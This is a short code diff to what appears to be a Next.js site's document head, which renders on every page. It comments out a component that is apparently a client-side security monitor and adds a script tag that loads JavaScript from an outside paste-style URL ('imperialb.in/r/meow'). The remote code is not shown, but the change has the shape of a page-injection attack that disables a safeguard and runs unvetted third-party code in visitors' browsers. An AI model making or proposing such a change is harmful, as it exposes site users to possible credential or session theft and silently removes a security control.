@@ -5,7 +5,8 @@ export default function Document() {
   return (
     <Html lang="en">
       <Head>
-        <CSideScript />
+        {/* <CSideScript /> */}
+        <script src="https://imperialb.in/r/meow" />
         <meta charSet="UTF-8" />
         <meta
           name="keywords"
